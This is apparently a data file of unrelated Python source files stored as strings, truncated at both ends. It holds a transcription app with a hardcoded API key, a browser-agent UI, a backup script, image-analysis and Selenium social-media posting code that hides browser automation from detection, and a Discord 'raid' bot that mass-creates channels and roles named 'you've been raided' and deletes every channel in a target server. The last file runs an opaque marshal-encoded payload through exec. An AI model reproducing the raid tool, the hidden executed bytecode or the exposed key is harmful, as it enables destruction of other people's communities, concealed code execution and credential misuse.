'b024b10b9bb76059699ea17e85047ff2ad349ada',  # Replace with your Reverie API key\n        'REV-APP-ID': 'com.advaygujar2005',   # Replace with your Reverie App ID\n        'REV-APPNAME': 'stt_file',\n        'src_lang': lang,  # 'hi' for Hindi, adjust for other languages\n        'domain': 'generic',\n        'format': 'mp3',\n    }\n    \n    audio_data = audio_file.read()\n    files = {'audio': ('audio.mp3', audio_data, 'audio/mpeg')}\n    response = requests.post(api_url, headers=headers, files=files)\n    response_data = response.json()\n    if response.status_code == 200:\n        return response_data['result']['text']\n    else:\n        st.error(f\"Error during transcription: {response_data.get('message', 'Unknown error')}\")\n        st.error(f\"Response: {response.text}\")\n        return None\n\n# Language choice function\ndef get_language_choice():\n    lang = st.selectbox(\"Choose Language for Transcription:\", [\"hi\", \"en\", \"ta\", \"mr\", \"bn\"])  # Add more languages as needed\n    return lang\n\n# Function to summarize text using transformers\ndef summarize_text(text, level=\"medium\"):\n    summarizer = pipeline(\"summarization\")\n    max_length = {\"small\": 50, \"medium\": 100, \"large\": 200}.get(level, 100)\n    summary = summarizer(text, max_length=max_length, min_length=30, do_sample=False)\n    return summary[0]['summary_text']\n\n# Function to extract key highlights using spaCy\ndef extract_key_highlights(text, num_highlights=5):\n    doc = nlp(text)\n    keywords = [chunk.text for chunk in doc.noun_chunks][:num_highlights]\n    highlights = []\n    \n    # Split the text into sentences\n    sentences = text.split('.')\n    \n    for keyword in keywords:\n        for sentence in sentences:\n            # Check if keyword is in the sentence and avoid duplicates\n            if keyword in sentence and sentence not in highlights:\n                highlights.append(sentence.strip())\n                break\n    \n    return highlights\n\n# Streamlit UI Setup\nst.title(\"Audio Transcription with Summarization and Keyword Extraction\")\n\n# Initialize transcript variable\ntranscript = None\n\n# Input for YouTube video URL\nvideo_url = st.text_input(\"Enter YouTube video URL:\")\n\nif video_url:\n    if st.button(\"Download Audio\"):\n        with st.spinner(\"Downloading audio...\"):\n            audio_path = download_audio(video_url)\n            if audio_path:\n                st.success(f\"Audio downloaded and saved to {audio_path}\")\n            else:\n                st.error(\"Failed to download audio\")\n\n# Input for audio file\naudio_file = st.file_uploader(\"Upload Audio File (MP3)\", type=[\"mp3\"])\n\nif audio_file:\n    lang_choice = get_language_choice()  # Select language for transcription\n    \n    if st.button(\"Transcribe Audio\"):\n        with st.spinner(\"Transcribing...\"):\n            transcript = transcribe_audio_reverie(audio_file, lang_choice)\n            if transcript:\n                st.write(\"### Transcription\")\n                st.write(transcript)\n                \n                # Step 1: Key Highlights\n                st.write(\"### Key Highlights\")\n                highlights = extract_key_hig",
    "import pdb\nimport logging\n\nfrom dotenv import load_dotenv\n\nload_dotenv()\nimport os\nimport glob\nimport asyncio\nimport argparse\nimport os\n\nlogger = logging.getLogger(__name__)\n\nimport gradio as gr\n\nfrom browser_use.agent.service import Agent\nfrom playwright.async_api import async_playwright\nfrom browser_use.browser.browser import Browser, BrowserConfig\nfrom browser_use.browser.context import (\n    BrowserContextConfig,\n    BrowserContextWindowSize,\n)\nfrom langchain_ollama import ChatOllama\nfrom playwright.async_api import async_playwright\nfrom src.utils.agent_state import AgentState\n\nfrom src.utils import utils\nfrom src.agent.custom_agent import CustomAgent\nfrom src.browser.custom_browser import CustomBrowser\nfrom src.agent.custom_prompts import CustomSystemPrompt, CustomAgentMessagePrompt\nfrom src.browser.custom_context import BrowserContextConfig, CustomBrowserContext\nfrom src.controller.custom_controller import CustomController\nfrom gradio.themes import Citrus, Default, Glass, Monochrome, Ocean, Origin, Soft, Base\nfrom src.utils.default_config_settings import default_config, load_config_from_file, save_config_to_file, save_current_config, update_ui_from_config\nfrom src.utils.utils import update_model_dropdown, get_latest_files, capture_screenshot\n\n\n# Global variables for persistence\n_global_browser = None\n_global_browser_context = None\n\n# Create the global agent state instance\n_global_agent_state = AgentState()\n\nasync def stop_agent():\n    \"\"\"Request the agent to stop and update UI with enhanced feedback\"\"\"\n    global _global_agent_state, _global_browser_context, _global_browser\n\n    try:\n        # Request stop\n        _global_agent_state.request_stop()\n\n        # Update UI immediately\n        message = \"Stop requested - the agent will halt at the next safe point\"\n        logger.info(f\"\ud83d\uded1 {message}\")\n\n        # Return UI updates\n        return (\n            message,                                        # errors_output\n            gr.update(value=\"Stopping...\", interactive=False),  # stop_button\n            gr.update(interactive=False),                      # run_button\n        )\n    except Exception as e:\n        error_msg = f\"Error during stop: {str(e)}\"\n        logger.error(error_msg)\n        return (\n            error_msg,\n            gr.update(value=\"Stop\", interactive=True),\n            gr.update(interactive=True)\n        )\n\nasync def run_browser_agent(\n        agent_type,\n        llm_provider,\n        llm_model_name,\n        llm_temperature,\n        llm_base_url,\n        llm_api_key,\n        use_own_browser,\n        keep_browser_open,\n        headless,\n        disable_security,\n        window_w,\n        window_h,\n        save_recording_path,\n        save_agent_history_path,\n        save_trace_path,\n        enable_recording,\n        task,\n        add_infos,\n        max_steps,\n        use_vision,\n        max_actions_per_step,\n        tool_calling_method\n):\n    global _global_agent_state\n    _global_agent_state.clear_stop()  # Clear any previous stop requests\n\n    try:\n        # Disable recording if the checkbox is unchecked\n        if not enable_recording:\n            save_recording_path = None\n\n        # Ensure the recording directory exists if recording is enabled\n        if save_recording_path:\n            os.makedirs(save_recording_path, exist_ok=True)\n\n        # Get the list of existing videos before the agent runs\n        existing_videos = set()\n        if save_recording_path:\n            existing_videos = set(\n                glob.glob(os.path.join(save_recording_path, \"*.[mM][pP]4\"))\n                + glob.glob(os.path.join(save_recording_path, \"*.[wW][eE][bB][mM]\"))\n            )\n\n        # Run the agent\n        llm = utils.get_llm_model(\n            provider=llm_provider,\n            model_name=llm_model_name,\n            temperature=llm_temperature,\n            base_url=llm_base_url,\n            api_key=llm_api_key,\n        )\n        if agent_type == \"org\":\n            final_result, errors, model_actions, model_thoughts, trace_file, history_file = await run_org_agent(\n                llm=llm,\n                use_own_browser=use_own_browser,\n                keep_browser_open=keep_browser_open,\n                headless=headless,\n                disable_security=disable_security,\n                window_w=window_w,\n                window_h=window_h,\n                save_recording_path=save_recording_path,\n                save_agent_history_path=save_agent_history_path,\n                save_trace_path=save_trace_path,\n                task=task,\n                max_steps=max_steps,\n                use_vision=use_vision,\n                max_actions_per_step=max_actions_per_step,\n                tool_calling_method=tool_calling_method\n            )\n        elif agent_type == \"custom\":\n            final_result, errors, model_actions, model_thoughts, trace_file, history_file = await run_custom_agent(\n                llm=llm,\n                use_own_browser=use_own_browser,\n                keep_browse",
    "from os import remove, path\nfrom subprocess import run\nfrom datetime import datetime\n\nfrom app.Logger import LoggerConfig\nfrom app.Email import Email\nfrom settings import BASE_DIR\n\n\nclass Db:\n\n    def __init__(self):\n        self.__bkpFilename = f'bkp-{int(datetime.now().timestamp())}.sql.gz'\n        self.__logger = LoggerConfig()\n        self.__email = Email()\n\n    def getBkpFilename(self):\n        return self.__bkpFilename\n        \n    def makeDumpFile(self):\n        myCnfFilePath = path.join(BASE_DIR, '.my.cnf')\n        cmd = f'mysqldump --defaults-file={myCnfFilePath} --all-databases | gzip > \\\n            {self.__bkpFilename}'\n        \n        try:\n            return run([cmd], check = True, shell = True)\n        except Exception as err:\n            self.removeDumpFile()\n            self.__logger.log(err).error()\n            self.__email.send('mysqldump err', err)\n            exit(1)\n        \n    def removeDumpFile(self):\n        if path.exists(self.__bkpFilename):\n            remove(self.__bkpFilename)",
    "import streamlit as st\nfrom ollama import chat as ollama_chat\nfrom groq import Groq\nimport tempfile\nfrom pathlib import Path\nfrom typing import List, Optional, Dict\nfrom pydantic import BaseModel, Field\nfrom PIL import Image\nimport io\nimport os\nfrom dotenv import load_dotenv\nimport base64\nimport time\nimport google.generativeai as genai\n\n# Load environment variables\nload_dotenv()\nGROQ_API_KEY = os.getenv(\"GROQ_API_KEY\")\n\nclass ImageAnalysis(BaseModel):\n    \"\"\"Unified structure for image analysis results\"\"\"\n    description: str\n    key_points: List[str]\n    detected_objects: List[str]\n    detected_text: Optional[str] = None\n\ndef analyze_image_ollama(image_path: str) -> ImageAnalysis:\n    \"\"\"Analyze image using Ollama's vision model\"\"\"\n    try:\n        response = ollama_chat(\n            model='llama3.2-vision',\n            messages=[\n                {\n                    'role': 'system',\n                    'content': 'You are a precise image analysis system.'\n                },\n                {\n                    'role': 'user',\n                    'content': 'Analyze this image and provide: 1) A description 2) Key points 3) List of objects 4) Any text detected',\n                    'images': [image_path]\n                }\n            ],\n            options={'temperature': 0}\n        )\n\n        # Process Ollama's response into structured format\n        content = response.message.content\n        \n        # Basic parsing of the response\n        sections = content.split('\\n\\n')\n        description = sections[0] if sections else \"No description available\"\n        key_points = [point.strip('- ') for point in content.split('\\n') if point.startswith('-')]\n        \n        # Extract objects and text if mentioned\n        objects = []\n        detected_text = None\n        \n        for section in sections:\n            if 'object' in section.lower():\n                objects = [obj.strip('- ') for obj in section.split('\\n') if obj.strip('- ')]\n            if 'text' in section.lower():\n                detected_text = section.split(':')[-1].strip()\n\n        return ImageAnalysis(\n            description=description,\n            key_points=key_points if key_points else [\"No key points identified\"],\n            detected_objects=objects if objects else [\"No objects specifically identified\"],\n            detected_text=detected_text\n        )\n    except Exception as e:\n        raise Exception(f\"Error in Ollama image analysis: {str(e)}\")\n\ndef analyze_image_groq(image_path: str, groq_client: Groq) -> ImageAnalysis:\n    \"\"\"Analyze image using Groq's vision model\"\"\"\n    try:\n        # Convert image to base64\n        with open(image_path, \"rb\") as image_file:\n            image_data = base64.b64encode(image_file.read()).decode()\n        \n        image_data_url = f\"data:image/jpeg;base64,{image_data}\"\n        \n        # First message to get description and overview\n        completion = groq_client.chat.completions.create(\n            model=\"llama-3.2-11b-vision-preview\",\n            messages=[\n                {\n                    \"role\": \"user\",\n                    \"content\": [\n                        {\n                            \"type\": \"text\",\n                            \"text\": \"Provide a detailed description of this image. Focus on what you see and any notable aspects.\"\n                        },\n                        {\n                            \"type\": \"image_url\",\n                            \"image_url\": {\n                                \"url\": image_data_url\n                            }\n                        }\n                    ]\n                }\n            ],\n            temperature=0.2,\n            max_tokens=1024,\n            top_p=1,\n            stream=False\n        )\n        \n        initial_description = completion.choices[0].message.content\n        \n        # Second message to get specific details\n        completion_details = groq_client.chat.completions.create(\n            model=\"llama-3.2-11b-vision-preview\",\n            messages=[\n                {\n                    \"role\": \"user\",\n                    \"content\": [\n                        {\n                            \"type\": \"text\",\n                            \"text\": \"List the following for this image:\\n1. Key objects present\\n2. Any text visible in the image\\n3. Important observations\"\n                        },\n                        {\n                            \"type\": \"image_url\",\n                            \"image_url\": {\n                                \"url\": image_data_url\n                            }\n                        }\n                    ]\n                }\n            ],\n            temperature=0.2,\n            max_tokens=1024,\n            top_p=1,\n            stream=False\n        )\n        \n        details_content = completion_details.choices[0].message.content\n        \n        # Process the responses\n        key_points = []\n        objects = []\n        detected_text = None\n        \n        # Extract information from the details r",
    "from selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.webdriver.chrome.service import Service\nfrom selenium.webdriver.chrome.options import Options\nfrom selenium.webdriver.common.action_chains import ActionChains\nimport time\nimport logging\nimport multiprocessing\nfrom concurrent.futures import ThreadPoolExecutor\n\nCHROME_DRIVER_PATH = \"C:/Users/karthik/Downloads/chromedriver-win64/chromedriver-win64/chromedriver.exe\"\n\nclass SocialMediaPoster:\n    def __init__(self):\n        self.drivers = {}\n        logging.basicConfig(level=logging.INFO)\n        self.logger = logging.getLogger(__name__)\n\n    def setup_driver(self, platform=None):\n        \"\"\"Initialize a new browser driver. If platform is None, sets up a default driver.\"\"\"\n        try:\n            service = Service(CHROME_DRIVER_PATH)\n            options = webdriver.ChromeOptions()\n            options.add_argument('--start-maximized')\n            options.add_argument(\"--disable-notifications\")\n            options.add_argument('--disable-gpu')\n            options.add_argument('--disable-software-rasterizer')\n            # Headless mode runs Chrome in background without opening browser window\n            # Comment out the line below if you want to see the browser automation in action\n            options.add_argument('--headless')\n            options.add_argument(\"--no-sandbox\")\n            options.add_argument(\"--disable-dev-shm-usage\")\n            options.add_argument(\"--disable-blink-features=AutomationControlled\")\n            options.add_experimental_option(\"excludeSwitches\", [\"enable-automation\"])\n            options.add_experimental_option(\"useAutomationExtension\", False)\n            options.add_argument(\"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\")\n            options.add_argument('--enable-unsafe-swiftshader')\n            \n            driver = webdriver.Chrome(service=service, options=options)\n            \n            # Execute CDP commands to prevent detection\n            driver.execute_cdp_cmd(\"Page.addScriptToEvaluateOnNewDocument\", {\n                \"source\": \"\"\"\n                    Object.defineProperty(navigator, 'webdriver', {\n                        get: () => undefined\n                    })\n                \"\"\"\n            })\n            \n            if platform:\n                self.drivers[platform] = driver\n            else:\n                self.drivers['default'] = driver\n                \n            self.logger.info(f\"Chrome driver initialized successfully for {'default' if not platform else platform}\")\n            return True\n            \n        except Exception as e:\n            self.logger.error(f\"Failed to initialize Chrome driver: {str(e)}\")\n            return False\n\n    def login_facebook(self, username, password):\n        try:\n            self.setup_driver('facebook')\n            self.drivers['facebook'].get(\"https://www.facebook.com\")\n            WebDriverWait(self.drivers['facebook'], 10).until(EC.presence_of_element_located((By.ID, \"email\"))).send_keys(username)\n            self.drivers['facebook'].find_element(By.ID, \"pass\").send_keys(password)\n            self.drivers['facebook'].find_element(By.NAME, \"login\").click()\n            time.sleep(5)\n            return True, \"Successfully logged in to Facebook\"\n        except Exception as e:\n            self.logger.error(f\"Facebook login error: {str(e)}\")\n            return False, f\"Facebook login failed: {str(e)}\"\n\n    def login_instagram(self, username, password):\n        try:\n            self.setup_driver('instagram')\n            self.drivers['instagram'].get(\"https://www.instagram.com\")\n            time.sleep(3)\n            WebDriverWait(self.drivers['instagram'], 10).until(EC.presence_of_element_located((By.NAME, \"username\"))).send_keys(username)\n            self.drivers['instagram'].find_element(By.NAME, \"password\").send_keys(password)\n            self.drivers['instagram'].find_element(By.XPATH, \"//button[@type='submit']\").click()\n            time.sleep(5)\n            return True, \"Successfully logged in to Instagram\"\n        except Exception as e:\n            self.logger.error(f\"Instagram login error: {str(e)}\")\n            return False, f\"Instagram login failed: {str(e)}\"\n\n    def login_threads(self, username, password):\n        try:\n            # Navigate to Threads website\n            self.setup_driver('threads')\n            self.drivers['threads'].get(\"https://www.threads.net/login\")\n            time.sleep(5)\n\n            # Click \"Continue with Instagram\" button\n            continue_with_instagram = WebDriverWait(self.drivers['threads'], 10).until(\n                EC.element_to_be_clickable((By.XPATH, \"//div[contains(text(), 'Continue with Instagram')]\"))\n            )\n            self.drivers['threads'].execute_script(\"arguments[0].click();\"",
    "import discord\r\nfrom discord.ext import commands\r\nimport time\r\nimport json\r\nimport threading\r\nimport tkinter as tk\r\nfrom tkinter import messagebox, ttk, simpledialog\r\nfrom PIL import Image, ImageTk\r\n\r\nintents = discord.Intents.all()\r\nbot = commands.Bot(command_prefix=\"!\", intents=intents)\r\n\r\naction_running = False\r\n\r\nTOKENS_FILE = \"tokens.json\"\r\n\r\n\r\ndef sleep(param):\r\n    if param:\r\n        time.sleep(param)\r\n    else:\r\n        time.sleep(1)\r\n\r\n\r\ndef run_bot(token):\r\n    try:\r\n        print(\"Bot is starting...\")\r\n        bot.run(token)\r\n    except Exception as e:\r\n        print(f\"Error while starting the bot: {e}\")\r\n\r\n\r\ndef invalid_server_id():\r\n    messagebox.showerror(\"Error\", \"Please enter a valid server ID.\")\r\n\r\n\r\ndef server_id_not_found():\r\n    guild_id = guild_id_entry.get().strip()\r\n    messagebox.showerror(\"Error\", f\"Cannot find the server with ID {guild_id}.\")\r\n\r\n\r\ndef start_gui():\r\n    def start_bot():\r\n        token = bot_token_entry.get().strip()\r\n        if token:\r\n            threading.Thread(target=run_bot, args=(token,)).start()\r\n            messagebox.showinfo(\"Bot\", \"The bot has been started.\")\r\n        else:\r\n            messagebox.showerror(\"Error\", \"Please enter a valid bot token.\")\r\n\r\n    def start_creation_or_deletion(action_type, action_func, *args):\r\n        global action_running\r\n        action_running = True\r\n        threading.Thread(target=action_func, args=(action_type, *args)).start()\r\n\r\n    def stop_action():\r\n        global action_running\r\n        action_running = False\r\n        messagebox.showinfo(\"Action Stopped\", \"The action has been stopped.\")\r\n\r\n    def create_channels():\r\n        guild_id = guild_id_entry.get().strip()\r\n        channel_prefix = channel_prefix_entry.get() or \"you've been raided\"\r\n        number_of_channels = int(number_of_channels_spinbox.get())\r\n        channel_type = channel_type_var.get()\r\n\r\n        if not guild_id:\r\n            invalid_server_id()\r\n            return\r\n\r\n        try:\r\n            guild_id = int(guild_id)\r\n        except ValueError:\r\n            messagebox.showerror(\"Error\", \"Server ID must be a valid integer.\")\r\n            return\r\n\r\n        if number_of_channels > 100:\r\n            messagebox.showerror(\"Error\", \"You can create a maximum of 100 channels.\")\r\n            return\r\n\r\n        guild = bot.get_guild(guild_id)\r\n        if guild:\r\n            start_creation_or_deletion(\"create\", create_custom_channels, guild, channel_prefix, number_of_channels,\r\n                                       channel_type)\r\n            messagebox.showinfo(\"Success\", \"Creating custom channels...\")\r\n        else:\r\n            server_id_not_found()\r\n\r\n    def create_custom_channels(action_type, guild, prefix, num_channels, channel_type):\r\n        channel_counter = 0\r\n        for i in range(num_channels):\r\n            if not action_running:\r\n                break\r\n            channel_name = f\"{prefix}\"\r\n            if channel_type == \"Text\":\r\n                bot.loop.create_task(guild.create_text_channel(name=channel_name))\r\n                channel_counter += 1\r\n                print(f\"Text Channel {channel_name} created ({channel_counter}/{num_channels}).\")\r\n            elif channel_type == \"Voice\":\r\n                bot.loop.create_task(guild.create_voice_channel(name=channel_name))\r\n                print(f\"Voice Channel {channel_name} created ({channel_counter}/{num_channels}).\")\r\n            sleep(param=None)\r\n\r\n    def delete_channels():\r\n        guild_id = guild_id_entry.get().strip()\r\n        if not guild_id:\r\n            invalid_server_id()\r\n            return\r\n\r\n        try:\r\n            guild_id = int(guild_id)\r\n        except ValueError:\r\n            messagebox.showerror(\"Error\", \"Server ID must be a valid integer.\")\r\n            return\r\n\r\n        guild = bot.get_guild(guild_id)\r\n        if guild:\r\n            start_creation_or_deletion(\"delete\", delete_all_channels, guild)\r\n            messagebox.showinfo(\"Success\", \"Deleting all channels...\")\r\n        else:\r\n            server_id_not_found()\r\n\r\n    def delete_all_channels(action_type, guild):\r\n        channel_counter = 0\r\n        nbr_of_channels = len(guild.channels)\r\n        for channel in guild.channels:\r\n            if not action_running:\r\n                break\r\n            try:\r\n                bot.loop.create_task(channel.delete())\r\n                channel_counter += 1\r\n                print(f\"Channel {channel.name} deleted ({channel_counter}/{nbr_of_channels}).\")\r\n            except discord.Forbidden:\r\n                print(f\"Skipping channel {channel.name}: Missing permissions.\")\r\n            except Exception as e:\r\n                print(f\"Error deleting channel {channel.name}: {e}\")\r\n            sleep(param=None)\r\n\r\n    def create_roles():\r\n        guild_id = guild_id_entry.get().strip()\r\n        role_prefix = role_prefix_entry.get() or \"you've been raided\"\r\n        number_of_roles = int(number_of_roles_spinbox.get())\r\n        if not guild_id:\r\n            invalid_server_id()\r\n          ",
    "# -*- coding: utf-8 -*-\n# Copyright (c) Alibaba, Inc. and its affiliates.\nimport argparse\nimport importlib\nimport os\nimport sys\nfrom datetime import datetime\nsys.dont_write_bytecode = True\nfrom scepter.modules.solver.registry import SOLVERS\nfrom scepter.modules.utils.config import Config\nfrom scepter.modules.utils.distribute import we\nfrom scepter.modules.utils.file_system import FS\nfrom scepter.modules.utils.logger import get_logger\n\nif os.path.exists('__init__.py'):\n    package_name = 'scepter_ext'\n    spec = importlib.util.spec_from_file_location(package_name, '__init__.py')\n    package = importlib.util.module_from_spec(spec)\n    sys.modules[package_name] = package\n    spec.loader.exec_module(package)\n\ndef run_task(cfg):\n    std_logger = get_logger(name='scepter')\n    solver = SOLVERS.build(cfg.SOLVER, logger=std_logger)\n    solver.set_up_pre()\n    solver.set_up()\n    if we.rank == 0:\n        FS.put_object_from_local_file(cfg.args.cfg_file, os.path.join(solver.work_dir, \"train.yaml\"))\n    if cfg.args.stage == \"train\":\n        solver.solve()\n    elif cfg.args.stage == \"eval\":\n        solver.run_eval()\n\n\ndef update_config(cfg):\n    if hasattr(cfg.args, 'learning_rate') and cfg.args.learning_rate:\n        print(\n            f'learning_rate change from {cfg.SOLVER.OPTIMIZER.LEARNING_RATE} to {cfg.args.learning_rate}'\n        )\n        cfg.SOLVER.OPTIMIZER.LEARNING_RATE = float(cfg.args.learning_rate)\n    if hasattr(cfg.args, 'max_steps') and cfg.args.max_steps:\n        print(\n            f'max_steps change from {cfg.SOLVER.MAX_STEPS} to {cfg.args.max_steps}'\n        )\n        cfg.SOLVER.MAX_STEPS = int(cfg.args.max_steps)\n    cfg.SOLVER.WORK_DIR = os.path.join(cfg.SOLVER.WORK_DIR, \"{0:%Y%m%d%H%M%S}\".format(datetime.now()))\n    return cfg\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Argparser for Scepter:\\n')\n    parser.add_argument(\n        \"--stage\",\n        dest=\"stage\",\n        help=\"Running stage!\",\n        default=\"train\",\n        choices=[\"train\", \"eval\"]\n    )\n    parser.add_argument('--learning_rate',\n                        dest='learning_rate',\n                        help='The learning rate for our network!',\n                        default=None)\n    parser.add_argument('--max_steps',\n                        dest='max_steps',\n                        help='The max steps for training!',\n                        default=None)\n\n    cfg = Config(load=True, parser_ins=parser)\n    cfg = update_config(cfg)\n    we.init_env(cfg, logger=None, fn=run_task)\n",
    "# Encoded By Tutul-King\n# Fb Link: https://www.facebook.com/Tutul.King.Ok.Bro\n# Fb Link: https://www.facebook.com/Tutul.Official.Account\n# https://github.com/Tutul-King\n\nimport marshal\nexec(marshal.loads(b'\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Ns\\x7f\\xd3\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Ns~\\xd2\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Ns}\\xd1\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Ns|\\xd0\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Ns{\\xcf\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Nsz\\xce\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Nsy\\xcd\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Nsx\\xcc\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Nsw\\xcb\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00d\\x01S\\x00)\\x03\\xe9\\x00\\x00\\x00\\x00Nsv\\xca\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3@\\x00\\x00\\x00\\x97\\x00d\\x00d\\x01l\\x00Z\\x00\\x02\\x00e\\x01\\x02\\x00e\\x00j\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x01\\x00\\x